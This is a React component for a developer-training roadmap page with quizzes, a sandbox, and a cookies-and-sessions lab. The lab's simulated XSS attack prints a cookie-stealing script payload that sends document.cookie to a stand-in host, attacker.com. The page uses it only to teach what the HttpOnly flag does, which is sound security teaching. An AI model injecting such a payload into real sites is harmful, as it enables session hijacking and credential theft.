import { useState } from 'react';
import { useXPSystem } from '../features/xpSystem/xpSystem';
import { roadmapNodes } from '../data/roadmap';
import type { RoadmapNode } from '../data/roadmap';
import { Button } from '../components/Button';
import { 
  GitCommit, 
  CheckCircle2, 
  HelpCircle, 
  Code2, 
  Award,
  ChevronRight,
  RefreshCw,
  BookOpen,
  X
} from 'lucide-react';

export function Roadmap() {
  const { completedRoadmap, completeRoadmapNode, addXP, earnBadge } = useXPSystem();
  const [selectedNode, setSelectedNode] = useState<RoadmapNode | null>(null);
  const [quizAnswer, setQuizAnswer] = useState<string | null>(null);
  const [quizError, setQuizError] = useState(false);
  const [quizSuccess, setQuizSuccess] = useState(false);
  
  const [projectCode, setProjectCode] = useState('');
  const [projectSuccess, setProjectSuccess] = useState(false);
  const [projectError, setProjectError] = useState(false);
  
  const [activeTab, setActiveTab] = useState<'quiz' | 'project' | 'lab' | 'capstone'>('quiz');
  const [activeTopicIndex, setActiveTopicIndex] = useState(0);

  // New States for Cookies & Sessions Interactive Lab
  const [cookieName, setCookieName] = useState('session_id');
  const [cookieValue, setCookieValue] = useState('devcorp_token_99');
  const [cookieMaxAge, setCookieMaxAge] = useState(3600);
  const [cookieSecure, setCookieSecure] = useState(true);
  const [cookieHttpOnly, setCookieHttpOnly] = useState(true);
  const [cookieSameSite, setCookieSameSite] = useState<'Strict' | 'Lax' | 'None'>('Strict');
  const [builderXPEarned, setBuilderXPEarned] = useState(false);
  const [cookieGeneratedStr, setCookieGeneratedStr] = useState('Set-Cookie: session_id=devcorp_token_99; Secure; HttpOnly; SameSite=Strict; Max-Age=3600');

  // Vulnerability Detector
  const [vulnHttpOnly, setVulnHttpOnly] = useState(false);
  const [vulnSecure, setVulnSecure] = useState(false);
  const [vulnSameSite, setVulnSameSite] = useState(false);
  const [vulnSolved, setVulnSolved] = useState(false);
  const [vulnChecked, setVulnChecked] = useState(false);

  // Storage Playground
  const [playKey, setPlayKey] = useState('theme');
  const [playValue, setPlayValue] = useState('dark');
  const [playType, setPlayType] = useState<'cookie' | 'localStorage' | 'sessionStorage'>('localStorage');
  const [mockCookies, setMockCookies] = useState<Array<{name: string, value: string, httpOnly: boolean, secure: boolean}>>([
    { name: 'session_id', value: 'devcorp_token_99', httpOnly: true, secure: true }
  ]);
  const [mockLocalStorage, setMockLocalStorage] = useState<Record<string, string>>({
    theme: 'dark',
    user_language: 'en'
  });
  const [mockSessionStorage, setMockSessionStorage] = useState<Record<string, string>>({
    form_step: '1'
  });

  // XSS Attack simulator state
  const [xssLog, setXssLog] = useState<string[]>([]);
  const [xssStatus, setXssStatus] = useState<'idle' | 'success' | 'stolen'>('idle');

  // DevTools Challenge
  const [devtoolsTaskDeleted, setDevtoolsTaskDeleted] = useState(false);
  const [devtoolsSessionActive, setDevtoolsSessionActive] = useState(true);

  // Capstone simulator
  const [capstoneUsername, setCapstoneUsername] = useState('');
  const [capstonePassword, setCapstonePassword] = useState('');
  const [capstoneStep, setCapstoneStep] = useState(1); // 1: Login, 2: Cookie Config, 3: Exploit Verification, 4: Complete
  const [capstoneHttpOnly, setCapstoneHttpOnly] = useState(false);
  const [capstoneSecure, setCapstoneSecure] = useState(false);
  const [capstoneSameSite, setCapstoneSameSite] = useState<'Strict' | 'Lax' | 'None'>('Lax');
  const [capstoneLogs, setCapstoneLogs] = useState<string[]>([]);
  const [capstoneIsLoggedIn, setCapstoneIsLoggedIn] = useState(false);
  const [capstoneXssBlocked, setCapstoneXssBlocked] = useState(false);
  const [capstoneCsrfBlocked, setCapstoneCsrfBlocked] = useState(false);
  const [capstoneSolved, setCapstoneSolved] = useState(false);

  const rebuildCookieStr = (name: string, value: string, maxAge: number, secure: boolean, httpOnly: boolean, sameSite: string) => {
    setCookieGeneratedStr(`Set-Cookie: ${name}=${value}; Max-Age=${maxAge}; Path=/;${secure ? ' Secure;' : ''}${httpOnly ? ' HttpOnly;' : ''} SameSite=${sameSite}`);
  };

  const handleNodeClick = (node: RoadmapNode) => {
    setSelectedNode(node);
    setQuizAnswer(null);
    setQuizError(false);
    setQuizSuccess(completedRoadmap.includes(node.id));
    setProjectCode(node.miniProject.codeTemplate);
    setProjectSuccess(completedRoadmap.includes(node.id));
    setProjectError(false);
    setActiveTab('quiz');
    setActiveTopicIndex(0);

    // Reset Cookies & Sessions Lab state
    if (node.id === 'cookies_session') {
      setCookieName('session_id');
      setCookieValue('devcorp_token_99');
      setCookieMaxAge(3600);
      setCookieSecure(true);
      setCookieHttpOnly(true);
      setCookieSameSite('Strict');
      setCookieGeneratedStr('Set-Cookie: session_id=devcorp_token_99; Secure; HttpOnly; SameSite=Strict; Max-Age=3600');
      
      setVulnHttpOnly(false);
      setVulnSecure(false);
      setVulnSameSite(false);
      setVulnSolved(false);
      setVulnChecked(false);
      
      setMockCookies([
        { name: 'session_id', value: 'devcorp_token_99', httpOnly: true, secure: true }
      ]);
      setMockLocalStorage({
        theme: 'dark',
        user_language: 'en'
      });
      setMockSessionStorage({
        form_step: '1'
      });
      
      setXssLog([]);
      setXssStatus('idle');
      setDevtoolsTaskDeleted(false);
      setDevtoolsSessionActive(true);
      
      setCapstoneUsername('');
      setCapstonePassword('');
      setCapstoneStep(1);
      setCapstoneHttpOnly(false);
      setCapstoneSecure(false);
      setCapstoneSameSite('Lax');
      setCapstoneLogs([]);
      setCapstoneIsLoggedIn(false);
      setCapstoneXssBlocked(false);
      setCapstoneCsrfBlocked(false);
      setCapstoneSolved(completedRoadmap.includes(node.id));
    }
  };

  const handleQuizSubmit = (option: string) => {
    if (quizSuccess) return;
    setQuizAnswer(option);
    if (option === selectedNode?.quiz.answer) {
      setQuizSuccess(true);
      setQuizError(false);
    } else {
      setQuizError(true);
    }
  };

  const handleProjectSubmit = () => {
    if (!selectedNode || projectSuccess) return;
    
    const cleanUser = projectCode.replace(/\s+/g, ' ').trim();
    const cleanSolution = selectedNode.miniProject.solution.replace(/\s+/g, ' ').trim();
    
    if (cleanUser === cleanSolution || cleanUser.includes(cleanSolution.substring(0, 15))) {
      setProjectSuccess(true);
      setProjectError(false);
    } else {
      setProjectError(true);
    }
  };

  const handleCompleteMilestone = () => {
    if (!selectedNode) return;
    if (selectedNode.id === 'cookies_session' && (!quizSuccess || !projectSuccess || !capstoneSolved)) return;
    if (selectedNode.id !== 'cookies_session' && (!quizSuccess || !projectSuccess)) return;
    
    completeRoadmapNode(selectedNode.id);
    setSelectedNode(null);
  };

  return (
    <div className="p-6 max-w-4xl mx-auto flex flex-col gap-6 text-left animate-fade-in relative min-h-[80vh]">
      <div>
        <h1 className="text-2xl font-bold tracking-tight text-text-main flex items-center gap-2">
          <GitCommit className="w-6 h-6 text-neon-cyan animate-pulse" />
          DevCorp Training Roadmap Path
        </h1>
        <p className="text-sm text-text-muted mt-1">
          Learn modern software engineering concepts from Beginner to Pro. Select any module below to launch its intensive study guide, take the diagnostic quiz, and test your code in the sandbox.
        </p>
      </div>

      {/* Main Roadmap map tree (Full Width of the container) */}
      <div className="glass-panel p-6 rounded-xl border border-neon-blue/20 flex flex-col gap-4 relative overflow-hidden">
        <div className="absolute inset-0 cyber-grid opacity-10" />
        
        <div className="flex items-center justify-between border-b border-cyber-border pb-3 z-10">
          <span className="text-xs font-mono font-bold text-text-muted">TRAINING TIMELINE</span>
          <div className="flex items-center gap-4 text-[10px] font-mono">
            <span className="flex items-center gap-1 text-neon-green">
              <CheckCircle2 className="w-3.5 h-3.5" />
              Done
            </span>
            <span className="flex items-center gap-1 text-neon-cyan">
              <GitCommit className="w-3.5 h-3.5 animate-pulse" />
              Active / Selected
            </span>
            <span className="flex items-center gap-1 text-neon-blue">
              <BookOpen className="w-3.5 h-3.5" />
              Available Modules
            </span>
          </div>
        </div>

        {/* Node timeline map */}
        <div className="flex flex-col gap-4 z-10">
          {roadmapNodes.map((node, index) => {
            const isCompleted = completedRoadmap.includes(node.id);
            const isSelected = selectedNode?.id === node.id;

            return (
              <div key={node.id} className="flex items-center gap-4">
                {/* Visual connector lines */}
                {index < roadmapNodes.length - 1 && (
                  <div className="relative">
                    <div className="absolute left-[23px] top-[48px] bottom-[-20px] w-[2px] bg-cyber-bg border-l-2 border-dashed border-cyber-border" />
                  </div>
                )}

                {/* Node bullet */}
                <div 
                  onClick={() => handleNodeClick(node)}
                  className={`flex-1 flex items-center justify-between p-4 rounded-xl border transition-all duration-300 ${
                    isCompleted
                      ? 'bg-gradient-to-r from-green-950/20 to-cyber-bg/45 border-green-500/30 hover:border-green-500 cursor-pointer'
                      : isSelected
                        ? 'bg-neon-cyan/10 border-neon-cyan text-text-main shadow-[0_0_15px_rgba(76,201,240,0.2)] cursor-pointer'
                        : 'bg-cyber-card border-neon-cyan/20 hover:border-neon-cyan/50 hover:bg-neon-cyan/5 cursor-pointer'
                  }`}
                >
                  <div className="flex items-center gap-4">
                    {/* Left status badge */}
                    <div className={`p-2 rounded-lg border transition-all duration-300 ${
                      isCompleted 
                        ? 'bg-green-500/10 border-green-500/40 text-neon-green font-bold' 
                        : isSelected 
                          ? 'bg-neon-cyan/10 border-neon-cyan/40 text-neon-cyan' 
                          : 'bg-text-muted/5 border-cyber-border text-neon-blue/60'
                    }`}>
                      {isCompleted ? (
                        <CheckCircle2 className="w-4 h-4" />
                      ) : isSelected ? (
                        <GitCommit className="w-4 h-4 animate-pulse" />
                      ) : (
                        <BookOpen className="w-4 h-4" />
                      )}
                    </div>

                    <div className="flex flex-col text-left">
                      <span className="text-sm font-bold text-text-main">
                        {node.label}
                      </span>
                      <span className="text-xs text-text-muted mt-0.5">
                        {node.description}
                      </span>
                    </div>
                  </div>

                  <div className="flex items-center gap-3">
                    <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-text-muted/5 border border-cyber-border text-text-muted capitalize hidden sm:inline">
                      {node.category}
                    </span>
                    <ChevronRight className={`w-4 h-4 ${isSelected ? 'text-neon-cyan' : 'text-neon-blue/50'}`} />
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      </div>

      {/* Full-width Modal Overlay */}
      {selectedNode && (
        <div className="fixed inset-0 z-50 bg-black/80 backdrop-blur-md flex items-center justify-center p-4 md:p-6 animate-fade-in">
          <div className="bg-cyber-bg/95 border border-neon-cyan/45 w-full max-w-6xl h-[90vh] rounded-2xl flex flex-col overflow-hidden relative shadow-[0_0_50px_rgba(76,201,240,0.2)]">
            
            {/* Modal Top Bar */}
            <div className="bg-cyber-card border-b border-cyber-border px-6 py-4 flex items-center justify-between z-10">
              <div className="flex items-center gap-3">
                <span className="text-[10px] font-mono bg-neon-cyan/15 text-neon-cyan border border-neon-cyan/30 px-2 py-0.5 rounded uppercase tracking-wider">
                  {selectedNode.category}
                </span>
                <h2 className="text-base md:text-lg font-bold text-text-main tracking-wide">{selectedNode.label} Workspace</h2>
              </div>
              <button 
                onClick={() => setSelectedNode(null)}
                className="p-1.5 rounded-lg border border-cyber-border hover:border-red-500/50 hover:bg-red-500/10 text-text-muted hover:text-red-500 transition-all cursor-pointer"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Split layout inside modal */}
            <div className="flex-1 grid grid-cols-1 lg:grid-cols-5 overflow-hidden">
              
              {/* Left Side (Study Center - 3/5 width) */}
              <div className="lg:col-span-3 h-full flex flex-col p-6 border-r border-cyber-border overflow-y-auto scrollbar-thin">
                {/* Topic selection tabs */}
                <div className="flex flex-wrap gap-2 border-b border-cyber-border pb-3 mb-4">
                  {selectedNode.studyContent.map((topic, tIdx) => (
                    <button
                      key={topic.title}
                      onClick={() => setActiveTopicIndex(tIdx)}
                      className={`px-3 py-1.5 rounded-lg text-xs font-mono border transition-all duration-200 cursor-pointer ${
                        activeTopicIndex === tIdx
                          ? 'bg-neon-cyan/15 border-neon-cyan text-neon-cyan font-bold shadow-[0_0_10px_rgba(76,201,240,0.15)]'
                          : 'bg-cyber-bg/40 border-cyber-border text-text-muted hover:text-text-main hover:border-text-main/15'
                      }`}
                    >
                      Chapter {tIdx + 1}: {topic.title}
                    </button>
                  ))}
                </div>

                {/* Study Guide Content Body */}
                {(() => {
                  const activeTopic = selectedNode.studyContent[activeTopicIndex] || selectedNode.studyContent[0];
                  if (!activeTopic) return null;
                  return (
                    <div className="flex flex-col gap-4 text-left">
                      <div>
                        <h3 className="text-lg font-bold text-text-main font-sans tracking-wide">
                          {activeTopic.title}
                        </h3>
                        <p className="text-xs text-neon-cyan/85 mt-1 font-semibold">
                          {activeTopic.description}
                        </p>
                      </div>

                      <div className="border-t border-cyber-border pt-2" />

                      <ul className="flex flex-col gap-3">
                        {activeTopic.points.map((point, pIdx) => (
                          <li key={pIdx} className="flex gap-2.5 text-sm text-text-main/90 leading-relaxed items-start">
                            <span className="text-neon-cyan mt-1 select-none font-bold font-mono text-[10px]">&gt;&gt;</span>
                            <span>{point}</span>
                          </li>
                        ))}
                      </ul>

                      {(() => {
                        const snippet = activeTopic.codeSnippet;
                        if (!snippet) return null;
                        if (snippet.includes('| Feature')) {
                          const lines = snippet.split('\n').map(l => l.replace(/^\/\/\s*/, '').trim()).filter(l => l.startsWith('|'));
                          if (lines.length > 2) {
                            const headers = lines[0].split('|').map(s => s.trim()).filter(Boolean);
                            const rows = lines.slice(2).map(line => line.split('|').map(s => s.trim()).filter(Boolean));
                            
                            return (
                              <div className="overflow-x-auto border border-cyber-border rounded-lg bg-cyber-bg/40 my-3">
                                <table className="min-w-full text-xs font-sans text-left border-collapse">
                                  <thead>
                                    <tr className="border-b border-cyber-border bg-neon-cyan/5">
                                      {headers.map(h => (
                                        <th key={h} className="p-3 font-bold text-neon-cyan uppercase tracking-wider">{h}</th>
                                      ))}
                                    </tr>
                                  </thead>
                                  <tbody>
                                    {rows.map((row, rIdx) => (
                                      <tr key={rIdx} className="border-b border-cyber-border/40 hover:bg-white/5 transition-colors">
                                        {row.map((cell, cIdx) => (
                                          <td key={cIdx} className="p-3 text-text-main/90 font-medium">
                                            {cell.includes('✅') || cell.includes('❌') ? (
                                              <span className="text-sm">{cell}</span>
                                            ) : cell}
                                          </td>
                                        ))}
                                      </tr>
                                    ))}
                                  </tbody>
                                </table>
                              </div>
                            );
                          }
                        }

                        return (
                          <div className="mt-3 border border-cyber-border rounded-lg overflow-hidden bg-terminal-bg shadow-lg">
                            <div className="bg-black/20 px-4 py-2 border-b border-cyber-border flex items-center justify-between">
                              <div className="flex gap-1.5">
                                <span className="w-2 h-2 rounded-full bg-red-500/80" />
                                <span className="w-2 h-2 rounded-full bg-yellow-500/80" />
                                <span className="w-2 h-2 rounded-full bg-green-500/80" />
                              </div>
                              <span className="text-[10px] font-mono text-text-muted/70">reference_cheatsheet.tsx</span>
                            </div>
                            <pre className="p-4 text-xs font-mono text-neon-blue overflow-x-auto whitespace-pre leading-relaxed scrollbar-thin">
                              {snippet}
                            </pre>
                          </div>
                        );
                      })()}

                      {activeTopic.proTip && (
                        <div className="mt-2 border border-amber-500/20 bg-amber-500/5 p-4 rounded-xl flex flex-col gap-2 shadow-[0_0_15px_rgba(245,158,11,0.03)]">
                          <div className="flex items-center gap-2 text-amber-400 font-mono text-xs font-bold tracking-wider uppercase">
                            <span>💡 Pro Developer Insight</span>
                          </div>
                          <p className="text-xs text-text-main/90 leading-relaxed font-medium">
                            {activeTopic.proTip}
                          </p>
                        </div>
                      )}
                    </div>
                  );
                })()}
              </div>

              {/* Right Side (Practice & Validate - 2/5 width) */}
              <div className="lg:col-span-2 h-full flex flex-col p-6 bg-cyber-bg/30 overflow-y-auto scrollbar-thin border-t lg:border-t-0 lg:border-l border-cyber-border animate-fade-in">
                <div className="border-b border-cyber-border pb-2 mb-4">
                  <span className="text-[10px] font-mono text-neon-cyan font-bold tracking-widest uppercase">
                    PRACTICE & VALIDATE
                  </span>
                </div>

                {/* Workspace Navigation tabs */}
                <div className="flex flex-wrap bg-cyber-bg/50 border border-cyber-border p-1 rounded-lg mb-4 gap-1">
                  <button
                    onClick={() => setActiveTab('quiz')}
                    className={`flex-1 min-w-[70px] flex items-center justify-center gap-1.5 py-2 rounded text-[11px] font-semibold cursor-pointer transition-colors ${
                      activeTab === 'quiz' 
                        ? 'bg-neon-cyan text-black font-bold' 
                        : 'text-text-muted hover:text-text-main'
                    }`}
                  >
                    <HelpCircle className="w-3.5 h-3.5" />
                    <span>Quiz</span>
                  </button>
                  
                  <button
                    onClick={() => setActiveTab('project')}
                    className={`flex-1 min-w-[80px] flex items-center justify-center gap-1.5 py-2 rounded text-[11px] font-semibold cursor-pointer transition-colors ${
                      activeTab === 'project' 
                        ? 'bg-neon-cyan text-black font-bold' 
                        : 'text-text-muted hover:text-text-main'
                    }`}
                  >
                    <Code2 className="w-3.5 h-3.5" />
                    <span>Sandbox</span>
                  </button>

                  {selectedNode.id === 'cookies_session' && (
                    <>
                      <button
                        onClick={() => setActiveTab('lab')}
                        className={`flex-1 min-w-[80px] flex items-center justify-center gap-1 py-1 rounded text-[11px] font-semibold cursor-pointer transition-colors ${
                          activeTab === 'lab' 
                            ? 'bg-neon-cyan text-black font-bold' 
                            : 'text-text-muted hover:text-text-main'
                        }`}
                      >
                        <RefreshCw className="w-3 h-3 animate-pulse" />
                        <span>Storage Lab</span>
                      </button>

                      <button
                        onClick={() => setActiveTab('capstone')}
                        className={`flex-1 min-w-[80px] flex items-center justify-center gap-1 py-1 rounded text-[11px] font-semibold cursor-pointer transition-colors ${
                          activeTab === 'capstone' 
                            ? 'bg-neon-cyan text-black font-bold' 
                            : 'text-text-muted hover:text-text-main'
                        }`}
                      >
                        <Award className="w-3.5 h-3.5" />
                        <span>Capstone</span>
                      </button>
                    </>
                  )}
                </div>

                <div className="flex-1 flex flex-col min-h-0">
                  {/* Tab Content: Quiz */}
                  {activeTab === 'quiz' && (
                    <div className="flex-1 flex flex-col gap-3 text-left">
                      <h4 className="text-xs font-mono text-text-muted font-bold uppercase tracking-wider">
                        Diagnostic Question:
                      </h4>
                      <p className="text-xs font-bold text-text-main leading-relaxed">
                        {selectedNode.quiz.question}
                      </p>

                      <div className="flex flex-col gap-2 mt-2">
                        {selectedNode.quiz.options.map((option) => {
                          const isOptionSelected = quizAnswer === option;
                          const isCorrect = option === selectedNode.quiz.answer;
                          
                          let btnBorder = 'border-cyber-border bg-cyber-card text-text-muted hover:border-neon-cyan/50 hover:text-text-main';
                          if (isOptionSelected) {
                            btnBorder = isCorrect 
                              ? 'border-green-500 bg-green-500/10 text-green-500 font-bold' 
                              : 'border-red-500 bg-red-500/10 text-red-500';
                          } else if (quizSuccess && isCorrect) {
                            btnBorder = 'border-green-500/40 bg-green-500/5 text-green-400';
                          }

                          return (
                            <button
                              key={option}
                              disabled={quizSuccess}
                              onClick={() => handleQuizSubmit(option)}
                              className={`w-full text-left p-3 rounded-lg border text-xs font-semibold transition-all duration-300 cursor-pointer ${btnBorder}`}
                            >
                              {option}
                            </button>
                          );
                        })}
                      </div>

                      {quizError && (
                        <div className="text-[10px] text-red-500 font-mono font-bold bg-red-500/10 border border-red-500/20 p-2.5 rounded-lg">
                          ⚠️ Compiler validation failed. Check your logic and try again.
                        </div>
                      )}

                      {quizSuccess && (
                        <div className="text-[10px] text-neon-green font-mono font-bold bg-green-500/10 border border-green-500/20 p-2.5 rounded-lg">
                          ✓ Diagnostic verification approved. Quiz section cleared.
                        </div>
                      )}
                    </div>
                  )}

                  {/* Tab Content: Mini Project */}
                  {activeTab === 'project' && (
                    <div className="flex-1 flex flex-col gap-3 text-left">
                      <h4 className="text-xs font-mono text-text-muted font-bold uppercase tracking-wider">
                        Coding Objective:
                      </h4>
                      <p className="text-xs text-text-main/90 leading-relaxed font-semibold">
                        {selectedNode.miniProject.prompt}
                      </p>

                      <div className="flex flex-col gap-1.5 mt-2">
                        <span className="text-[10px] font-mono text-text-muted/70">WORKSPACE FILE: index.css / index.ts</span>
                        <textarea
                          value={projectCode}
                          disabled={projectSuccess}
                          onChange={(e) => setProjectCode(e.target.value)}
                          rows={8}
                          className="w-full bg-terminal-bg border border-cyber-border rounded-lg p-3 font-mono text-xs text-neon-blue focus:outline-none focus:border-neon-cyan resize-none"
                        />
                      </div>

                      <div className="flex justify-between items-center mt-1">
                        <button
                          onClick={() => setProjectCode(selectedNode.miniProject.codeTemplate)}
                          className="flex items-center gap-1 text-[10px] font-mono text-text-muted hover:text-text-main transition-colors cursor-pointer"
                        >
                          <RefreshCw className="w-3.5 h-3.5" />
                          <span>Reset file</span>
                        </button>
                        
                        <Button
                          variant="primary"
                          size="sm"
                          disabled={projectSuccess}
                          onClick={handleProjectSubmit}
                        >
                          Verify Script &rarr;
                        </Button>
                      </div>

                      {projectError && (
                        <div className="text-[10px] text-red-500 font-mono font-bold bg-red-500/10 border border-red-500/20 p-2.5 rounded-lg">
                          ⚠️ Compiler validation failed. Code outputs do not match requirements.
                        </div>
                      )}

                      {projectSuccess && (
                        <div className="text-[10px] text-neon-green font-mono font-bold bg-green-500/10 border border-green-500/20 p-2.5 rounded-lg">
                          ✓ Script verification approved. Compiler check cleared.
                        </div>
                      )}
                    </div>
                  )}

                  {/* Tab Content: Storage Lab */}
                  {selectedNode.id === 'cookies_session' && activeTab === 'lab' && (
                    <div className="flex-1 flex flex-col gap-5 text-left text-xs text-text-main overflow-y-auto scrollbar-thin pr-1 pb-4">
                      {/* Interactive Cookie Builder */}
                      <div className="border border-cyber-border/40 p-4 rounded-xl bg-cyber-card flex flex-col gap-3">
                        <div className="flex items-center justify-between border-b border-cyber-border pb-1.5">
                          <span className="font-bold font-sans text-neon-cyan uppercase">1. Interactive Cookie Builder</span>
                          <span className="text-[10px] font-mono text-text-muted">Reward: +5 XP</span>
                        </div>
                        <p className="text-[11px] text-text-muted">Configure cookie attributes and construct a production-ready HTTP response header.</p>
                        
                        <div className="grid grid-cols-2 gap-2">
                          <div className="flex flex-col gap-0.5">
                            <label className="text-[10px] font-mono text-text-muted">Name</label>
                            <input 
                              type="text" 
                              value={cookieName}
                              onChange={(e) => {
                                setCookieName(e.target.value);
                                rebuildCookieStr(e.target.value, cookieValue, cookieMaxAge, cookieSecure, cookieHttpOnly, cookieSameSite);
                              }}
                              className="bg-terminal-bg border border-cyber-border rounded px-2 py-1 text-xs text-neon-blue focus:outline-none focus:border-neon-cyan"
                            />
                          </div>
                          <div className="flex flex-col gap-0.5">
                            <label className="text-[10px] font-mono text-text-muted">Value</label>
                            <input 
                              type="text" 
                              value={cookieValue}
                              onChange={(e) => {
                                setCookieValue(e.target.value);
                                rebuildCookieStr(cookieName, e.target.value, cookieMaxAge, cookieSecure, cookieHttpOnly, cookieSameSite);
                              }}
                              className="bg-terminal-bg border border-cyber-border rounded px-2 py-1 text-xs text-neon-blue focus:outline-none focus:border-neon-cyan"
                            />
                          </div>
                          <div className="flex flex-col gap-0.5">
                            <label className="text-[10px] font-mono text-text-muted">Max-Age (seconds)</label>
                            <input 
                              type="number" 
                              value={cookieMaxAge}
                              onChange={(e) => {
                                const val = Number(e.target.value);
                                setCookieMaxAge(val);
                                rebuildCookieStr(cookieName, cookieValue, val, cookieSecure, cookieHttpOnly, cookieSameSite);
                              }}
                              className="bg-terminal-bg border border-cyber-border rounded px-2 py-1 text-xs text-neon-blue focus:outline-none"
                            />
                          </div>
                          <div className="flex flex-col gap-0.5">
                            <label className="text-[10px] font-mono text-text-muted">SameSite</label>
                            <select 
                              value={cookieSameSite}
                              onChange={(e) => {
                                const val = e.target.value as 'Strict' | 'Lax' | 'None';
                                setCookieSameSite(val);
                                rebuildCookieStr(cookieName, cookieValue, cookieMaxAge, cookieSecure, cookieHttpOnly, val);
                              }}
                              className="bg-terminal-bg border border-cyber-border rounded px-2 py-1 text-xs text-neon-blue focus:outline-none"
                            >
                              <option value="Strict">Strict</option>
                              <option value="Lax">Lax</option>
                              <option value="None">None</option>
                            </select>
                          </div>
                        </div>

                        <div className="flex items-center gap-4 mt-1">
                          <label className="flex items-center gap-1.5 cursor-pointer text-[11px] font-mono select-none">
                            <input 
                              type="checkbox" 
                              checked={cookieHttpOnly} 
                              onChange={(e) => {
                                setCookieHttpOnly(e.target.checked);
                                rebuildCookieStr(cookieName, cookieValue, cookieMaxAge, cookieSecure, e.target.checked, cookieSameSite);
                              }}
                              className="rounded border-cyber-border text-neon-cyan bg-terminal-bg"
                            />
                            <span>HttpOnly</span>
                          </label>

                          <label className="flex items-center gap-1.5 cursor-pointer text-[11px] font-mono select-none">
                            <input 
                              type="checkbox" 
                              checked={cookieSecure} 
                              onChange={(e) => {
                                setCookieSecure(e.target.checked);
                                rebuildCookieStr(cookieName, cookieValue, cookieMaxAge, e.target.checked, cookieHttpOnly, cookieSameSite);
                              }}
                              className="rounded border-cyber-border text-neon-cyan bg-terminal-bg"
                            />
                            <span>Secure</span>
                          </label>
                        </div>

                        <div className="bg-terminal-bg p-3 rounded border border-cyber-border flex flex-col gap-1">
                          <span className="text-[10px] font-mono text-text-muted">Generated Header:</span>
                          <span className="font-mono text-neon-blue break-all text-[11px]">{cookieGeneratedStr}</span>
                        </div>

                        <div className="flex justify-between items-center mt-1">
                          {builderXPEarned ? (
                            <span className="text-[10px] text-neon-green font-mono font-bold">✓ Secure Cookie Configured! +5 XP Added</span>
                          ) : (
                            <span className="text-[10px] text-text-muted font-mono">Requires HttpOnly & Secure to earn XP.</span>
                          )}
                          <Button 
                            variant="primary" 
                            size="sm"
                            onClick={() => {
                              const cookieObj = { name: cookieName, value: cookieValue, httpOnly: cookieHttpOnly, secure: cookieSecure };
                              setMockCookies(prev => [cookieObj, ...prev.filter(c => c.name !== cookieName)]);
                              
                              if (cookieSecure && cookieHttpOnly) {
                                if (!builderXPEarned) {
                                  setBuilderXPEarned(true);
                                  addXP(5);
                                }
                              }
                            }}
                          >
                            Verify & Store Cookie
                          </Button>
                        </div>
                      </div>

                      {/* Vulnerability Detector */}
                      <div className="border border-cyber-border/40 p-4 rounded-xl bg-cyber-card flex flex-col gap-3">
                        <div className="flex items-center justify-between border-b border-cyber-border pb-1.5">
                          <span className="font-bold font-sans text-neon-cyan uppercase">2. Vulnerability Detector</span>
                        </div>
                        <p className="text-[11px] text-text-muted">Analyze this response header and declare the missing security flags:</p>
                        
                        <div className="bg-terminal-bg p-2.5 rounded border border-red-500/20 text-red-400 font-mono text-[11px]">
                          Set-Cookie: token=abc123
                        </div>

                        <div className="flex flex-col gap-1.5 mt-1 font-mono text-[11px]">
                          <label className="flex items-center gap-2 cursor-pointer select-none">
                            <input 
                              type="checkbox" 
                              checked={vulnHttpOnly} 
                              onChange={(e) => setVulnHttpOnly(e.target.checked)}
                              className="rounded border-cyber-border text-neon-cyan"
                            />
                            <span>Missing HttpOnly flag</span>
                          </label>
                          <label className="flex items-center gap-2 cursor-pointer select-none">
                            <input 
                              type="checkbox" 
                              checked={vulnSecure} 
                              onChange={(e) => setVulnSecure(e.target.checked)}
                              className="rounded border-cyber-border text-neon-cyan"
                            />
                            <span>Missing Secure flag</span>
                          </label>
                          <label className="flex items-center gap-2 cursor-pointer select-none">
                            <input 
                              type="checkbox" 
                              checked={vulnSameSite} 
                              onChange={(e) => setVulnSameSite(e.target.checked)}
                              className="rounded border-cyber-border text-neon-cyan"
                            />
                            <span>Missing SameSite configuration</span>
                          </label>
                        </div>

                        <Button 
                          variant="secondary"
                          size="sm"
                          className="w-full mt-1"
                          onClick={() => {
                            setVulnChecked(true);
                            if (vulnHttpOnly && vulnSecure && vulnSameSite) {
                              setVulnSolved(true);
                            } else {
                              setVulnSolved(false);
                            }
                          }}
                        >
                          Check Security Compliance
                        </Button>

                        {vulnChecked && (
                          <div className={`p-2.5 rounded-lg border text-[10px] font-mono ${
                            vulnSolved 
                              ? 'bg-green-500/10 border-green-500/20 text-neon-green' 
                              : 'bg-red-500/10 border-red-500/20 text-red-500'
                          }`}>
                            {vulnSolved 
                              ? '✓ Compliant! You successfully detected that the token is exposed to XSS script stealing, HTTP network sniffing, and CSRF requests forging.' 
                              : '❌ Vulnerabilities still exist. Ensure all three vulnerable attributes are selected!'}
                          </div>
                        )}
                      </div>

                      {/* XSS Attack Simulator */}
                      <div className="border border-cyber-border/40 p-4 rounded-xl bg-cyber-card flex flex-col gap-3">
                        <div className="flex items-center justify-between border-b border-cyber-border pb-1.5">
                          <span className="font-bold font-sans text-neon-cyan uppercase">3. XSS Attack Simulator</span>
                        </div>
                        <p className="text-[11px] text-text-muted">Simulate a malicious script payload trying to steal active credentials via client-side DOM scripting.</p>

                        <Button 
                          variant="danger" 
                          size="sm"
                          className="w-full"
                          onClick={() => {
                            const hasHttpOnly = cookieHttpOnly;
                            setXssStatus('idle');
                            
                            const logs = [
                              `[Exploit] Injecting script: <script>fetch('attacker.com/steal?c=' + document.cookie)</script>`,
                              `[Exploit] Reading document.cookie...`
                            ];
                            
                            setXssLog(logs);
                            
                            setTimeout(() => {
                              if (!hasHttpOnly) {
                                setXssLog(prev => [
                                  ...prev,
                                  `[Exploit] Interception SUCCESS: Read value "${cookieName}=${cookieValue}"`,
                                  `🚨 CRITICAL: Cookies stolen! Session hijacked by XSS exploit.`
                                ]);
                                setXssStatus('stolen');
                              } else {
                                setXssLog(prev => [
                                  ...prev,
                                  `[Exploit] Interception FAILED: document.cookie returned empty string`,
                                  `🛡️ SECURE: Browser blocked script access due to HttpOnly flag.`
                                ]);
                                setXssStatus('success');
                              }
                            }, 1000);
                          }}
                        >
                          Trigger XSS Attack payload
                        </Button>

                        {xssLog.length > 0 && (
                          <div className="bg-terminal-bg p-3 rounded border border-cyber-border flex flex-col gap-1 font-mono text-[10px] text-neon-blue">
                            {xssLog.map((log, idx) => (
                              <span key={idx} className={log.includes('🚨') ? 'text-red-500' : log.includes('🛡️') ? 'text-neon-green' : ''}>
                                {log}
                              </span>
                            ))}
                          </div>
                        )}

                        {xssStatus === 'stolen' && (
